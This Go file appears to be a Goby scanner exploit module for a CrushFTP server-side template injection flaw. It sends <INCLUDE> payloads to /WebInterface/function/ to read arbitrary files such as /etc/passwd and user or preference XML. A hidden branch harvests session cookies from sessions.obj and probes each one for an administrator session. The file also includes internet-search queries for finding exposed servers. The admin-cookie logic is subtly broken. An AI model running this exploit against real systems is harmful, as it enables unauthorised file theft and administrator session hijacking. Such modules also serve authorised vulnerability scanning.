package exploits

import (
	"errors"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "CrushFTP /WebInterface/function  File Read Vulnerability",
    "Description": "<p>CrushFTP is a cross-platform FTP server software that supports FTP, FTPS, SFTP, HTTP, HTTPS and other protocols.</p><p>There were server-side template injection vulnerabilities before CrushFTP version 10.7.1 and version 11.1.0, which may cause unauthenticated threats to read files from the file system outside the virtual file system (VFS) sandbox, bypass authentication to obtain management access, and Execute the code remotely on the server.</p>",
    "Product": "crushftp",
    "Homepage": "https://www.crushftp.com/index.html",
    "DisclosureDate": "2024-03-27",
    "PostTime": "2024-04-25",
    "Author": "Town",
    "FofaQuery": "server=\"CrushFTP\" || header=\"/WebInterface/login.html\" || banner=\"/WebInterface/login.html\" || header=\"/WebInterface/w3c/p3p.xml\" || banner=\"/WebInterface/w3c/p3p.xml\" || title=\"CrushFTP\"",
    "GobyQuery": "server=\"CrushFTP\" || header=\"/WebInterface/login.html\" || banner=\"/WebInterface/login.html\" || header=\"/WebInterface/w3c/p3p.xml\" || banner=\"/WebInterface/w3c/p3p.xml\" || title=\"CrushFTP\"",
    "Level": "3",
    "Impact": "<p>There were server-side template injection vulnerabilities before CrushFTP version 10.7.1 and before version 11.1.0, which may cause unauthenticated threats to read files from the file system outside the virtual file system (VFS) sandbox, bypass authentication to obtain administrative access, and remotely execute code on the server.</p>",
    "Recommendation": "<p>At present, the vulnerability has been fixed, and affected users can upgrade to CrushFTP 10.7.1, 11.1.0 or later. Download link: <a href=\"https://crushftp.com/download.html\">https://crushftp.com/download.html</a></p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "Type",
            "type": "select",
            "value": "DefaultFilePath,ConsumerFilePath",
            "show": ""
        },
        {
            "name": "DefaultFilePath",
            "type": "select",
            "value": "C://Windows//win.ini,/etc/passwd",
            "show": "Type=DefaultFilePath"
        },
        {
            "name": "InputFilePath",
            "type": "input",
            "value": "",
            "show": "Type=ConsumerFilePath"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Read"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.7",
    "Translation": {
        "CN": {
            "Name": "CrushFTP /WebInterface/function 文件读取漏洞",
            "Product": "crushftp",
            "Description": "<p>CrushFTP是一款支持FTP、FTPS、SFTP、HTTP、HTTPS等协议的跨平台FTP服务器软件。&nbsp;</p><p>CrushFTP 10.7.1版本之前和11.1.0版本之前存在服务器端模板注入漏洞，可能导致未经身份验证的威胁者从虚拟文件系统（VFS）沙箱外部的文件系统读取文件、绕过身份验证获得管理访问权限，并在服务器上远程执行代码。<br></p>",
            "Recommendation": "<p>目前该漏洞已经修复，受影响用户可升级到CrushFTP 10.7.1、11.1.0或更高版本。 下载链接：<a href=\"https://crushftp.com/download.html\">https://crushftp.com/download.html</a><br></p>",
            "Impact": "<p>CrushFTP 10.7.1版本之前和11.1.0版本之前存在服务器端模板注入漏洞，可能导致未经身份验证的威胁者从虚拟文件系统（VFS）沙箱外部的文件系统读取文件、绕过身份验证获得管理访问权限，并在服务器上远程执行代码。<br></p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "CrushFTP /WebInterface/function  File Read Vulnerability",
            "Product": "crushftp",
            "Description": "<p>CrushFTP is a cross-platform FTP server software that supports FTP, FTPS, SFTP, HTTP, HTTPS and other protocols.</p><p>There were server-side template injection vulnerabilities before CrushFTP version 10.7.1 and version 11.1.0, which may cause unauthenticated threats to read files from the file system outside the virtual file system (VFS) sandbox, bypass authentication to obtain management access, and Execute the code remotely on the server.</p>",
            "Recommendation": "<p>At present, the vulnerability has been fixed, and affected users can upgrade to CrushFTP 10.7.1, 11.1.0 or later. Download link: <a href=\"https://crushftp.com/download.html\">https://crushftp.com/download.html</a><br></p>",
            "Impact": "<p>There were server-side template injection vulnerabilities before CrushFTP version 10.7.1 and before version 11.1.0, which may cause unauthenticated threats to read files from the file system outside the virtual file system (VFS) sandbox, bypass authentication to obtain administrative access, and remotely execute code on the server.<br></p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocGlobalParams": {},
    "ExpGlobalParams": {},
    "PocId": "10943"
}`

	GetCookie := func(hostInfo *httpclient.FixUrl) (string, error) {
		getRequestConfig := httpclient.NewGetRequestConfig("/WebInterface/")
		getRequestConfig.VerifyTls = false
		getRequestConfig.FollowRedirect = true
		resp, err := httpclient.DoHttpRequest(hostInfo, getRequestConfig)
		if err != nil {
			return "", err
		}
		re := regexp.MustCompile(`CrushAuth=([\w_]+);`)
		match := re.FindStringSubmatch(resp.Cookie)
		if len(match) > 1 {
			return match[1], nil
		} else {
			return "", errors.New("cookie匹配错误")
		}
	}

	FileRead := func(hostInfo *httpclient.FixUrl, Cookie string, FilePath string) (string, error) {
		postRequestConfig := httpclient.NewPostRequestConfig("/WebInterface/function/")
		postRequestConfig.VerifyTls = false
		postRequestConfig.FollowRedirect = false
		//设置请求头
		postRequestConfig.Header.Store("Cookie", "CrushAuth="+Cookie+"; currentAuth="+Cookie[len(Cookie)-4:]+"")
		//设置请求体
		postRequestConfig.Data = "command=exists&random=0.34712915617878926&paths=" + FilePath + "&c2f=" + Cookie[len(Cookie)-4:]
		//请求
		resp, err := httpclient.DoHttpRequest(hostInfo, postRequestConfig)
		if err != nil {
			return "", err
		}
		return resp.Utf8Html, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			Cookie, err := GetCookie(hostInfo)
			if err != nil {
				return false
			}
			resp, err := FileRead(hostInfo, Cookie, "<INCLUDE>users/MainUsers/groups.XML</INCLUDE>")
			if err != nil {
				return false
			}
			if strings.Contains(resp, "<groups") {
				ss.VulURL = hostInfo.FixedHostInfo + "/WebInterface/function/"
				return true
			} else {
				resp, err = FileRead(hostInfo, Cookie, "<INCLUDE>prefs.XML</INCLUDE>")
				ss.VulURL = hostInfo.FixedHostInfo + "/WebInterface/function/"
				return strings.Contains(resp, "<server_prefs")
			}
		},

		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			//匿名登录测试
			Cookie, err := GetCookie(expResult.HostInfo)
			if err != nil {
				expResult.Success = false
				expResult.Output = err.Error()
				return expResult
			}
			Type := goutils.B2S(ss.Params["Type"])
			if Type == "GetAdminCookie" {
				FilePath := ""
				resp, err := FileRead(expResult.HostInfo, Cookie, "{working_dir}")
				re := regexp.MustCompile(`<response>([\s\S]*?):false</response>`)
				if err != nil {
					expResult.Success = false
					return expResult
				}
				match := re.FindStringSubmatch(resp)
				if len(match) > 1 {
					if match[1] == "{working_dir}" {
						expResult.Success = false
						return expResult
					}
					FilePath = match[1] + "sessions.obj"
				} else {
					expResult.Success = false
					expResult.Output = "文件内容匹配失败！"
					return expResult
				}
				resp, err = FileRead(expResult.HostInfo, Cookie, "<INCLUDE>"+FilePath+"</INCLUDE>")
				re = regexp.MustCompile(`(\d{13}_[A-Za-z0-9]+)`)
				matches := re.FindAllString(resp, -1)
				if len(matches) >= 1000 {
					expResult.Success = false
					expResult.Output = "Cookie超过1000个，不予测试。"
				}
				for _, cookie := range matches {
					getRequestConfig := httpclient.NewGetRequestConfig("/WebInterface/function/?command=getUsername&c2f=" + cookie[len(cookie)-4:])
					getRequestConfig.VerifyTls = false
					getRequestConfig.FollowRedirect = true
					getRequestConfig.Header.Store("Cookie", "CrushAuth="+cookie+"; currentAuth="+cookie[len(cookie)-4:]+"")
					resp, err := httpclient.DoHttpRequest(expResult.HostInfo, getRequestConfig)
					if err != nil {
						continue
					}
					if strings.Contains(resp.Utf8Html, "admin") {
						expResult.Success = true
						expResult.Output = "管理员cookie：" + cookie
					}
				}
				expResult.Success = false
				expResult.Output = "暂未有可用的管理员Cookie"
				return expResult
			}
			//文件读取
			FilePath := ""
			if Type == "DefaultFilePath" {
				FilePath = "<INCLUDE>" + goutils.B2S(ss.Params["DefaultFilePath"]) + "</INCLUDE>"
			} else {
				FilePath = "<INCLUDE>" + goutils.B2S(ss.Params["InputFilePath"]) + "</INCLUDE>"
			}
			resp, err := FileRead(expResult.HostInfo, Cookie, FilePath)
			if err != nil {
				return expResult
			}
			re := regexp.MustCompile(`<response>([\s\S]*?)</response>`)
			match := re.FindStringSubmatch(resp)
			if len(match) > 1 {
				if strings.Contains(match[1], "INCLUDE") {
					expResult.Success = false
					expResult.Output = "当前文件读取失败，建议更换文件进行测试！"
					return expResult
				}
				expResult.Success = true
				expResult.Output = match[1]
			} else {
				expResult.Success = false
				expResult.Output = "文件内容匹配失败！"
			}
			return expResult
		},
	))
}
